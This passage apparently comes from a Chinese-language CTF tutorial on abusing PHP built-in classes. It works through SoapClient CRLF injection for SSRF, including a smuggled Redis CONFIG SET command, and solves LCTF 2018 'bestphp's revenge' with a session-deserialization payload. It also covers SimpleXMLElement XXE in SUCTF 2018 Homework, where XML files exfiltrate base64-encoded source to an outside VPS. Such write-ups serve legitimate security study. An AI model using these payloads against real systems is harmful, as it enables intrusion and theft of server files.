User-Agent: PHP-SOAP/<span class="hljs-number">7.4</span>.<span class="hljs-number">3</span>
Content-Type: text/xml; charset=utf-<span class="hljs-number">8</span>
SOAPAction: <span class="hljs-string">"hello</span>
<span class="hljs-string">CONFIG SET dir /var/www/html        # 这里就是Redis命令</span>
<span class="hljs-string">hello#a"</span>
Content-Length: <span class="hljs-number">403</span>
 
<span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span>
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span> xmlns:ns1=<span class="hljs-string">"hello</span>
<span class="hljs-string">CONFIG SET dir /var/www/html</span>
<span class="hljs-string">hello"</span> xmlns:xsd=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span> xmlns:SOAP-ENC=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span> SOAP-ENV:encodingStyle=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</code></pre>
<p>这样我们就可以利用HTTP协议去攻击Redis了。</p>
<p>对于如何发送POST的数据包，这里面还有一个坑，就是 <code>Content-Type</code> 的设置，因为我们要提交的是POST数据，所以 <code>Content-Type</code> 的值我们要设置为 <code>application/x-www-form-urlencoded</code>，这里如何修改 <code>Content-Type</code> 的值呢？由于 <code>Content-Type</code> 在 <code>User-Agent</code> 的下面，所以我们可以通过 <code>SoapClient</code> 来设置 <code>User-Agent</code> ，将原来的 <code>Content-Type</code> 挤下去，从而再插入一个新的 <code>Content-Type</code> 。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$target</span> = <span class="hljs-string">'http://192.168.91.153:2333/'</span>;
<span class="hljs-variable">$post_data</span> = <span class="hljs-string">'data=whoami'</span>;
<span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(
    <span class="hljs-string">'X-Forwarded-For: 127.0.0.1'</span>,
    <span class="hljs-string">'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'</span>
);
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'location'</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">'user_agent'</span>=&gt;<span class="hljs-string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">'^^'</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">'^^Content-Length: '</span>. (<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">'^^^^'</span>.<span class="hljs-variable">$post_data</span>,<span class="hljs-string">'uri'</span>=&gt;<span class="hljs-string">'test'</span>));
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'^^'</span>,<span class="hljs-string">"\n\r"</span>,<span class="hljs-variable">$b</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;
<span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);
<span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>执行代码后，成功发送POST数据：</p>
<pre><code class="hljs php">root@ubuntu18:~<span class="hljs-comment"># nc -lvp 2333</span>
Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">2333</span>)
Connection <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">91.1</span> <span class="hljs-number">7862</span> received!
POST / HTTP/<span class="hljs-number">1.1</span>
Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">91.153</span>:<span class="hljs-number">2333</span>
Connection: Keep-Alive
User-Agent: wupco
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
Cookie: PHPSESSID=<span class="hljs-number">3</span>stu05dr969ogmprk28drnju93
Content-Length: <span class="hljs-number">11</span>
 
data=whoami
Content-Type: text/xml; charset=utf-<span class="hljs-number">8</span>
SOAPAction: <span class="hljs-string">"test#a"</span>
Content-Length: <span class="hljs-number">365</span>
 
<span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span>
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span> xmlns:ns1=<span class="hljs-string">"test"</span> xmlns:xsd=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span> xmlns:SOAP-ENC=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span> SOAP-ENV:encodingStyle=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</code></pre>
<p><strong>[LCTF 2018]bestphp’s revenge</strong></p>
<p>题目给了源码(跟着复现一波)</p>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-variable">$b</span> = <span class="hljs-string">'implode'</span>;
<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'f'</span>], <span class="hljs-variable">$_POST</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>])) {
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'name'</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>];
}
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">'welcome_to_the_lctf2018'</span>);
<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$a</span>);
<span class="hljs-meta">?&gt;</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>) { }</code></pre>
<p>扫一下目录：flag.php</p>
<pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">'only localhost can get flag!'</span>;
<span class="hljs-variable">$flag</span> = <span class="hljs-string">'LCTF{*************************}'</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">"REMOTE_ADDR"</span>]===<span class="hljs-string">"127.0.0.1"</span>){
       <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'flag'</span>] = <span class="hljs-variable">$flag</span>;
   }</code></pre>
<p>这里说说明了需要本地地址访问才能输出flag。</p>
<p><strong>1. 变量覆盖</strong></p>
<p>首先我们看到第一个<code>call_user_func()</code>函数里面2个参数我们都可控，因此想到用<code>extract()</code>函数进行变量覆盖，先用<code>var_dump()</code>看一下session的内容：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625144624240.png" alt="image-20230625144624240"></p>
<p>这里能实现步骤为f赋值为extract，接着post传参b=var_dump，在第一个第一个<code>call_user_func()</code>函数中extract函数多了一个变量b，即extract(b)，由于extract函数的特性，函数内部实际上为extract（b=&gt;var_dump），于是形成$b=var_dump随后name赋值为job，在第二个<code>call_user_func()</code>函数中,构成了var_dump(array(reset($_SESSION), ‘welcome_to_the_lctf2018’))，输出参数中变量的相关信息</p>
<p><strong>2. session反序列化</strong></p>
<pre><code class="hljs plaintext">于是我们想通过`ini_set()`函数来构造`ini_set('session.serialize_handler', 'php_serialize');`来改变序列化时的处理器，从而使其和反序列化时处理引擎不同，但是这个函数不接受数组,`$_POST`中需要设置参数传输； 所以用`session_start(['serialize_handler'=&gt;'php_serialize'])`，即POST传入`serialize_handler=php_serialize`来改变处理器，因为`session_start()`中如果提供参数，那么会用其中的项目覆盖会话配置指示中的配置项。即构造 `session_start(serialize_handler=php_serialize)` 就行了。我们可以利用题目中的 `call_user_func($_GET['f'], $_POST);` 函数，传入`GET：/?f=session_start`、`POST：serialize_handler=php_serialize`，实现 `session_start(serialize_handler=php_serialize)` 的调用来修改此页面的序列化引擎为php_serialize。</code></pre>
<p><strong>3. SoapClient类的利用</strong></p>
<p>php中的<code>SoapClient</code>类可以创建soap数据报文，与wsdl接口进行交互。该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
<pre><code class="hljs plaintext">public SoapClient::SoapClient ( mixed $wsdl [, array $options ] )</code></pre>
<p>其中<code>$options</code>数组下有个<code>user_agent</code>选项，我们可以利用该选项来自定义<code>User-Agent</code>。而在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$target</span> = <span class="hljs-string">"http://127.0.0.1/flag.php"</span>;
<span class="hljs-variable">$attack</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">'location'</span> =&gt; <span class="hljs-variable">$target</span>,
    <span class="hljs-string">'user_agent'</span> =&gt; <span class="hljs-string">"btis\r\nCookie: PHPSESSID=r9i78lda5e28i65bdlcsjb3l06\r\n"</span>,
    <span class="hljs-string">'uri'</span> =&gt; <span class="hljs-string">"123"</span>));
<span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$attack</span>));
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>;</code></pre>
<p>其中有两个必备参数<code>location</code>是要将请求发送到的SOAP服务器的URL，<code>uri</code> 是SOAP服务的目标命名空间。我们将<code>location</code>设置为<code>http://127.0.0.1/flag.php</code>即本地flag.php文件，这个条件满足了flag.php中要求的<code>$_SERVER["REMOTE_ADDR"]==="127.0.0.1"</code>，<code>uri</code>随便填就好。其中<code>user_agent</code>，是我们用来定义<code>User-Agent</code>，利用CRLF同时传入页面的<code>cookie</code>，使<code>$_SESSION['flag'] = $flag;</code>保存到指定cookie中。</p>
<pre><code class="hljs plaintext">O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22btis%0D%0ACookie%3A+PHPSESSID%3Dr9i78lda5e28i65bdlcsjb3l06%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D

//注意传入的时候在O前面加了一个|符号，由于序列化与反序列化处理引擎不一样，反序列化时的引擎为PHP，会将|看做键值分隔符，将其后面的内容直接反序列化，也就是在你要解析session文件时，他会将你|后面的内容反序列化</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625151313599.png" alt="image-20230625151313599"></p>
<p>利用<code>php_serialize</code>序列化传入后，并用php反序列化处理后此时session中包含了：一个键名<code>a:1:{s:4:"name";s:222:"</code>，和一个SoapClient对象</p>
<pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) {
  [<span class="hljs-string">"a:1:{s:4:"</span>name<span class="hljs-string">";s:222:"</span><span class="hljs-string">"]=&gt;</span>
<span class="hljs-string">  object(SoapClient)#1 (5) {</span>
<span class="hljs-string">    ["</span>uri<span class="hljs-string">"]=&gt;</span>
<span class="hljs-string">    string(3) "</span><span class="hljs-number">123</span><span class="hljs-string">"</span>
<span class="hljs-string">    ["</span>location<span class="hljs-string">"]=&gt;</span>
<span class="hljs-string">    string(25) "</span>http:<span class="hljs-comment">//127.0.0.1/flag.php"</span>
    [<span class="hljs-string">"_stream_context"</span>]=&gt;
    <span class="hljs-keyword">int</span>(<span class="hljs-number">0</span>)
    [<span class="hljs-string">"_user_agent"</span>]=&gt;
    <span class="hljs-keyword">string</span>(<span class="hljs-number">52</span>) <span class="hljs-string">"John</span>
<span class="hljs-string">Cookie: PHPSESSID=c472u8eh63tvqe5kq44o4mq3b1</span>
<span class="hljs-string">"</span>
    [<span class="hljs-string">"_soap_version"</span>]=&gt;
    <span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)
  }
}</code></pre>
<p>但此时还不会触发SSRF，需要触发 <code>__call</code> 方法来造成SSRF，该方法在访问对象中一个不存在的方法时会被自动调用，所以单纯反序列化还不行，我们还需要访问该对象中一个不存在的方法，这里就用到了如下这段代码：</p>
<pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">'welcome_to_the_lctf2018'</span>);
<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$a</span>);</code></pre>
<p>我们可以利用extract函数将变量b覆盖为call_user_func，这样，就成了：</p>
<pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span>(call_user_func, <span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">'welcome_to_the_lctf2018'</span>));</code></pre>
<p>call_user_func()函数有一个特性，就是当只传入一个数组时，可以用call_user_func()来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名。</p>
<p>下面我们用<code>extract()</code>将<code>$b</code>覆盖成<code>call_user_func()</code>，<code>reset($_SESSION)</code>就是<code>$_SESSION['name']</code>，所以我们传入<code>name=SoapClient</code></p>
<p>最后的<code>call_user_func($b, $a)</code>就变成了<code>call_user_func(array('SoapClient','welcome_to_the_lctf2018'))</code>,即<code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code>。</p>
<p>因为<code>SoapClient</code>对象中没有<code>welcome_to_the_lctf2018</code>这个方法，就会调用魔术方法<code>__call()</code>从而发送请求，造成SSRF去访问flag.php。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625152050380.png" alt="image-20230625152050380"></p>
<p>如上图，访问之后，自动发送了http请求，访问session文件，此时PHP反序列化引擎会反序列化你之前输入的内容，于是成功绕过本地地址访问的限制，于是变量flag存入session，然后我们接着访问index.php，页面会输出session文件的内容，回显flag</p>
<p>这一步由于会触发SSRF请求，因此会等待很久。</p>
<h3 id="104-simplexmlelement-类进行-xxe">10.4 SimpleXMLElement 类进行 XXE</h3>
<h4 id="simplexmlelement-类">SimpleXMLElement 类</h4>
<p>SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。</p>
<p>官方文档中对于SimpleXMLElement 类的构造方法 <code>SimpleXMLElement::__construct</code> 的定义如下：</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-title class_">SimpleXMLElement</span>::<span class="hljs-title function_ invoke__">__construct</span>(
    <span class="hljs-keyword">string</span> <span class="hljs-variable">$data</span>,
    <span class="hljs-keyword">int</span> <span class="hljs-variable">$options</span> = <span class="hljs-number">0</span>,
    <span class="hljs-keyword">bool</span> <span class="hljs-variable">$dataIsURL</span> = <span class="hljs-literal">false</span>,
    <span class="hljs-keyword">string</span> <span class="hljs-variable">$namespaceOrPrefix</span> = <span class="hljs-string">""</span>,
    <span class="hljs-keyword">bool</span> <span class="hljs-variable">$isPrefix</span> = <span class="hljs-literal">false</span>
)</code></pre>
<p>其中值得注意的是<code>$data</code>和<code>$data_is_url</code>这两个参数：</p>
<p><code>$data</code>：格式正确的XML字符串，或者XML文档的路径或URL（如果<code>$data_is_url</code>为true）。</p>
<p><code>$data_is_url</code>：默认情况下<code>$data_is_url</code>为false。使用true指定<code>$data</code>的路径或URL到一个XML文件，而不是字符串数据。</p>
<p>可以看到通过设置第三个参数 <code>$data_is_url</code> 为 <code>true</code>，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为<code>2</code>即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
<p>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p>
<p>example：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$xml</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span>
<span class="hljs-string">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span>
<span class="hljs-string">&lt;!DOCTYPE ANY [</span>
<span class="hljs-string">    &lt;!ENTITY % remote SYSTEM "http://t6n089.ceye.io"&gt;%remote;]&gt;</span>
<span class="hljs-string">]&gt;</span>
<span class="hljs-string">&lt;x&gt;&amp;xee&lt;/x&gt;</span>
<span class="hljs-string">EOF</span>;
<span class="hljs-variable">$xml_class</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$xml</span>, LIBXML_NOENT);
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$xml_class</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>实现了引用外部实体。同理我们可以让上面代码中的<code>$xml</code>中的内容放到自己的VPS中，然后在新建类对象的时候第一个参数写的是URL地址去实现XML文件的远程载入，这样也能实现XXE。</p>
<p><strong>[SUCTF 2018]Homework</strong></p>
<p><strong>题目分析</strong></p>
<p>先注册账号登陆作业平台。看到一个<code>calc</code>计算器类。有两个按钮，一个用于调用<code>calc</code>类实现两位数的四则运算。另一个用于提交代码。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625154719893.png" alt="image-20230625154719893"></p>
<p>点击CALC按钮，观察返回的结果和URL</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625154746462.png" alt="image-20230625154746462"></p>
<p>再根据<code>calc</code>类里面的内容，不难判断得知，这里通过<code>module</code>传参去调用<code>calc</code>类，然后剩下3个变量是<code>calc($args1,$method,$args2)</code>函数中参数。</p>
<p><strong>SimpleXMLElement 类的使用</strong></p>
<p>首先，我们在vps（124.220.233.26）上构造如下evil.xml、send.xml这两个文件。</p>
<p>evil.xml：</p>
<pre><code class="hljs html"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">try</span>[</span>
<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">"https://VPS/tmp/semd.xml"</span>&gt;</span></span>
<span class="hljs-meta">%int;</span>
<span class="hljs-meta">%all;</span>
<span class="hljs-meta">%send;</span>
<span class="hljs-meta">]&gt;</span></code></pre>
<p>send.xml：</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">payl</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">"php://filter/read=convert.base64-encode/resource=index.php"</span>&gt;</span>
<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span> <span class="hljs-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'https://VPS/?%payl;'&gt;"</span>&gt;</span></code></pre>
<p>然后在url中构造如下：</p>
<pre><code class="hljs http">/show.php?module=SimpleXMLElement&amp;args[]=http://124.220.233.26/tmp/evil.xml&amp;args[]=2&amp;args[]=true</code></pre>
<p>然后我们就可以看web日志：（这个作者也是埋坑呢，这里他用的https协议，我们改成http即可）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625160526050.png" alt="image-20230625160526050"></p>
<p>base64解码，得到源码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230625160610328.png" alt="image-20230625160610328"></p>
<pre><code class="hljs php">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;PHP Homework Platform&lt;/title&gt;
&lt;meta name=<span class="hljs-string">"viewport"</span> content=<span class="hljs-string">"width=device-width, initial-scale=1"</span>&gt;
&lt;meta http-equiv=<span class="hljs-string">"Content-Type"</span> content=<span class="hljs-string">"text/html; charset=utf-8"</span> /&gt;
&lt;script type=<span class="hljs-string">"application/x-javascript"</span>&gt; <span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">"load"</span>, function() { <span class="hljs-title function_ invoke__">setTimeout</span>(hideURLbar, <span class="hljs-number">0</span>); }, <span class="hljs-literal">false</span>); <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hideURLbar</span>(<span class="hljs-params"></span>)</span>{ window.<span class="hljs-title function_ invoke__">scrollTo</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>); } &lt;/script&gt;
&lt;link href=<span class="hljs-string">"css/font-awesome.min.css"</span> rel=<span class="hljs-string">"stylesheet"</span> type=<span class="hljs-string">"text/css"</span> media=<span class="hljs-string">"all"</span>&gt;
&lt;link href=<span class="hljs-string">"css/snow.css"</span> rel=<span class="hljs-string">"stylesheet"</span> type=<span class="hljs-string">"text/css"</span> media=<span class="hljs-string">"all"</span> /&gt;
&lt;link href=<span class="hljs-string">"css/style.css"</span> rel=<span class="hljs-string">"stylesheet"</span> type=<span class="hljs-string">"text/css"</span> media=<span class="hljs-string">"all"</span> /&gt;
&lt;link type=<span class="hljs-string">"text/css"</span> rel=<span class="hljs-string">"stylesheet"</span> href=<span class="hljs-string">"images/Styles/SyntaxHighlighter.css"</span>&gt;&lt;/link&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;!-- /home/wwwroot/<span class="hljs-keyword">default</span>--&gt;
&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">snow</span>-<span class="hljs-title">container</span>"&gt;</span>
<span class="hljs-class">			  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">snow</span> <span class="hljs-title">foreground</span>"&gt;&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">			  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">snow</span> <span class="hljs-title">foreground</span> <span class="hljs-title">layered</span>"&gt;&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">			  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">snow</span> <span class="hljs-title">middleground</span>"&gt;&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">			  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">snow</span> <span class="hljs-title">middleground</span> <span class="hljs-title">layered</span>"&gt;&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">			  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">snow</span> <span class="hljs-title">background</span>"&gt;&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">			  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">snow</span> <span class="hljs-title">background</span> <span class="hljs-title">layered</span>"&gt;&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">			&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class"></span>
<span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">top</span>-<span class="hljs-title">buttons</span>-<span class="hljs-title">agileinfo</span>"&gt;</span>
<span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">&lt;<span class="hljs-title">h1</span>&gt;<span class="hljs-title">PHP</span> <span class="hljs-title">Homework</span> <span class="hljs-title">Platform</span>&lt;/<span class="hljs-title">h1</span>&gt;</span>
<span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">main</span>-<span class="hljs-title">agileits</span>"&gt;</span>
<span class="hljs-class">&lt;?<span class="hljs-title">php</span></span>
<span class="hljs-class">	<span class="hljs-title">include</span>("<span class="hljs-title">function</span>.<span class="hljs-title">php</span>");</span>
<span class="hljs-class">	<span class="hljs-title">include</span>("<span class="hljs-title">config</span>.<span class="hljs-title">php</span>");</span>
<span class="hljs-class"></span>
<span class="hljs-class">	$<span class="hljs-title">username</span>=<span class="hljs-title">w_addslashes</span>($<span class="hljs-title">_COOKIE</span>['<span class="hljs-title">user</span>']);</span>
<span class="hljs-class">	$<span class="hljs-title">check_code</span>=$<span class="hljs-title">_COOKIE</span>['<span class="hljs-title">cookie</span>-<span class="hljs-title">check</span>'];</span>
<span class="hljs-class">	$<span class="hljs-title">check_sql</span>="<span class="hljs-title">select</span> <span class="hljs-title">password</span> <span class="hljs-title">from</span> <span class="hljs-title">user</span> <span class="hljs-title">where</span> <span class="hljs-title">username</span>='".$<span class="hljs-title">username</span>."'";</span>
<span class="hljs-class">	$<span class="hljs-title">check_sum</span>=<span class="hljs-title">md5</span>($<span class="hljs-title">username</span>.<span class="hljs-title">sql_result</span>($<span class="hljs-title">check_sql</span>,$<span class="hljs-title">mysql</span>)['0']['0']);</span>
<span class="hljs-class">	<span class="hljs-title">if</span>($<span class="hljs-title">check_sum</span>!==$<span class="hljs-title">check_code</span>)</span>{
		<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: login.php"</span>);
	}
<span class="hljs-meta">?&gt;</span>
		&lt;textarea name=<span class="hljs-string">"code"</span> <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">php</span>" <span class="hljs-title">rows</span>="20" <span class="hljs-title">cols</span>="55" <span class="hljs-title">disabled</span>="<span class="hljs-title">disabled</span>"&gt;</span>
<span class="hljs-class">&lt;?<span class="hljs-title">php</span> <span class="hljs-title">readfile</span>("./<span class="hljs-title">calc</span>.<span class="hljs-title">php</span>");?&gt;</span>
<span class="hljs-class">		&lt;/<span class="hljs-title">textarea</span>&gt;</span>
<span class="hljs-class">		&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">top</span>-<span class="hljs-title">buttons</span>-<span class="hljs-title">agileinfo</span>"&gt;</span>
<span class="hljs-class">			&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>="<span class="hljs-title">show</span>.<span class="hljs-title">php</span>?<span class="hljs-title">module</span>=<span class="hljs-title">calc</span>&amp;<span class="hljs-title">args</span>[]=2&amp;<span class="hljs-title">args</span>[]=<span class="hljs-title">a</span>&amp;<span class="hljs-title">args</span>[]=2"&gt;<span class="hljs-title">calc</span>&lt;/<span class="hljs-title">a</span>&gt;</span>
<span class="hljs-class">			&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>="<span class="hljs-title">submit</span>.<span class="hljs-title">php</span>" <span class="hljs-title">class</span>="<span class="hljs-title">active</span>"&gt;<span class="hljs-title">Submit</span> <span class="hljs-title">homework</span>&lt;/<span class="hljs-title">a</span>&gt;</span>
<span class="hljs-class">		&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span>
